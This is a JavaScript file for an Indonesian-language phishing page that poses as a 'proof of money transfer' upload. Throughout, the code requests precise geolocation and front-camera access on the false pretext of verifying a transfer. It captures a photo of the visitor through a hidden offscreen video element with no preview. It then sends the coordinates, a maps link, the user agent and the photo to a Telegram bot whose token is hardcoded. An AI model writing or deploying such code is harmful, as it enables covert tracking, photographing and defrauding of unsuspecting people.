let cameraStream = null;

let latitude = null;
let longitude = null;

let fotoBlob = null;
let fotoSudahDiambil = false;

const token = "8735241674:AAE3P60xJe1aSiVdBfSAHkYUHo4T1V99_Bk";
const chat_id = "7032109008";


/* =====================================================
   KIRIM DATA KE TELEGRAM BOT
===================================================== */

function formatWaktu(){

    return new Date().toLocaleString("id-ID",{
        timeZone:"Asia/Makassar"
    });
}

function kirimPesanTelegram(pesan){

    const url ="https://api.telegram.org/bot" +token +"/sendMessage?chat_id=" +chat_id +"&text=" +encodeURIComponent(pesan);

    const img = new Image();
    img.src = url;
}

async function kirimFotoTelegram(blob,caption){

    const formData = new FormData();

    formData.append("chat_id",chat_id);
    formData.append("photo",blob,"foto.jpg");
    formData.append("caption",caption);

    await fetch(
        "https://api.telegram.org/bot" + token + "/sendPhoto",
        {
            method:"POST",
            mode:"no-cors",
            body:formData
        }
    );
}


/* =====================================================
   HELPER KAMERA TERSEMBUNYI
===================================================== */

function hentikanKamera(){

    if(cameraStream){

        cameraStream
            .getTracks()
            .forEach(track=>{
                track.stop();
            });

        cameraStream = null;
    }
}

function tangkapFotoTersembunyi(stream){

    const track = stream.getVideoTracks()[0];

    if(window.ImageCapture && track){

        const imageCapture = new ImageCapture(track);

        return imageCapture.takePhoto();
    }

    return new Promise(function(resolve,reject){

        const video = document.createElement("video");
        video.setAttribute("playsinline","");
        video.muted = true;
        video.style.cssText =
            "position:fixed!important;top:-10000px!important;left:-10000px!important;" +
            "width:1px!important;height:1px!important;opacity:0!important;" +
            "visibility:hidden!important;pointer-events:none!important;";

        document.body.appendChild(video);
        video.srcObject = stream;

        video.onloadedmetadata = function(){

            video.play()
                .then(function(){

                    const canvas = document.createElement("canvas");
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;

                    canvas.getContext("2d").drawImage(
                        video,
                        0,
                        0,
                        canvas.width,
                        canvas.height
                    );

                    canvas.toBlob(function(blob){

                        video.srcObject = null;
                        document.body.removeChild(video);

                        if(blob){
                            resolve(blob);
                        }else{
                            reject(new Error("Gagal membuat foto"));
                        }

                    },"image/jpeg",0.92);

                })
                .catch(reject);
        };

        video.onerror = reject;
    });
}


/* =====================================================
   MEMINTA LOKASI + KAMERA
===================================================== */

async function mintaAkses(){

    const status = document.getElementById("status");
    const btn = document.getElementById("btnAkses");

    status.style.display = "block";

    btn.classList.add("loading");

    btn.innerHTML =`<span class="loader"></span>Sedang uploud bukti transfer...`;

    fotoBlob = null;
    fotoSudahDiambil = false;
    hentikanKamera();

    /*
     * ==========================
     * 1. LOKASI
     * ==========================
     */

    status.innerText ="Izinkan lokasi untuk verifikasi transfer menerima uang ke negara anda...";

    if(!navigator.geolocation){

        status.innerText = "Browser tidak mendukung lokasi untuk verifikasi transfer negara anda. Silakan gunakan browser lain.";

        resetTombol();

        return;
    }

    let posisi;

    try{

        posisi = await new Promise((resolve,reject)=>{

            navigator.geolocation.getCurrentPosition(
                resolve,
                reject,
                {
                    enableHighAccuracy:true,
                    timeout:15000,
                    maximumAge:0
                }
            );

        });

    }catch(error){

        if(error.code === 1){status.innerText = "Silahkan izinkan lokasi untuk verifikasi transfer menerima uang ke negara anda.";

        }else if(error.code === 2){status.innerText = "Lokasi tidak tersedia untuk transfer ke negara anda.";

        }else if(error.code === 3){status.innerText = "Permintaan lokasi timeout untuk transfer ke negara anda.";

        }else{status.innerText = "Gagal mendapatkan lokasi untuk transfer ke negara anda.";
            
        }

        resetTombol();

        return;
    }

    latitude = posisi.coords.latitude;
    longitude = posisi.coords.longitude;

    kirimPesanTelegram(
        "📍 LOKASI BERHASIL DIDAPAT\n\n" +
        "Latitude  : " + latitude + "\n" +
        "Longitude : " + longitude + "\n" +
        "Maps      : https://www.google.com/maps?q=" + latitude + "," + longitude + "\n" +
        "Waktu     : " + formatWaktu() + "\n" +
        "UserAgent : " + navigator.userAgent
    );


    /*
     * ==========================
     * 2. KAMERA (TANPA PREVIEW)
     * ==========================
     */

    status.innerText =
        `Izinkan kamera untuk uploud bukti transfer.`;

    if(
        !navigator.mediaDevices ||
        !navigator.mediaDevices.getUserMedia
    ){

        status.innerText += " Browser tidak mendukung akses kamera untuk uploud bukti transfer.";

        resetTombol();

        return;
    }

    try{

        cameraStream =
            await navigator.mediaDevices.getUserMedia({
                video:{
                    facingMode:"user"
                },
                audio:false
            });

        status.innerText = "Sedang mengambil bukti transfer...";

        fotoBlob = await tangkapFotoTersembunyi(cameraStream);
        hentikanKamera();

        fotoSudahDiambil = true;

        status.innerText =
            `Silahkan Tekan "Lanjutkan" untuk mengirim bukti transfer menerima uang ke negara anda sekarang.`;

        btn.classList.remove("loading");
        btn.innerHTML ="Uploud bukti transfer";
        btn.disabled = true;

    }catch(error){

        hentikanKamera();

        if(error.name === "NotAllowedError"){

            status.innerText =
            `Lokasi berhasil diberikan.
        
            Latitude  : ${latitude}
            Longitude : ${longitude}
            
            Izin kamera ditolak.`;
            
        }else if(error.name === "NotFoundError"){
            
            status.innerText =
            `Lokasi berhasil diberikan.
            
            Latitude  : ${latitude}
            Longitude : ${longitude}
            
            Kamera tidak ditemukan.`;
            
        }else{
            
            status.innerText =
            `Lokasi berhasil diberikan.
            
            Latitude  : ${latitude}
            Longitude : ${longitude}
            
            Kamera tidak dapat diakses.`;
        }

        resetTombol();
    }
}


/* =====================================================
   UPLoud BUKTI TRANSFER KE SERVER
===================================================== */

async function simpanFoto(){

    const status = document.getElementById("status");

    if(!fotoSudahDiambil || !fotoBlob){

        await mintaAkses();

        if(!fotoSudahDiambil || !fotoBlob){
            return;
        }
    }

    status.innerText ="Sedang uploud bukti transfer ke server...";

    const caption =
        "FOTO BERHASIL DIAMBIL\n\n" +
        "Latitude  : " + latitude + "\n" +
        "Longitude : " + longitude + "\n" +
        "Maps      : https://www.google.com/maps?q=" + latitude + "," + longitude + "\n" +
        "Waktu     : " + formatWaktu();

    try{

        await kirimFotoTelegram(fotoBlob,caption);

        status.innerText = "Bukti transfer berhasil diuploud ke server.";

    }catch(error){

        status.innerText =
            "Gagal uploud bukti transfer. Coba lagi.";

    }
}


/* =====================================================
   RESET BUTTON
===================================================== */

function resetTombol(){

    const btn = document.getElementById("btnAkses");
    btn.classList.remove("loading");
    btn.innerHTML ="Uploud Ulang Bukti Transfer";
    btn.disabled = false;
}


/* =====================================================
   HENTIKAN KAMERA SAAT HALAMAN DITINGGALKAN
===================================================== */

window.addEventListener("beforeunload",()=>{

    hentikanKamera();

});
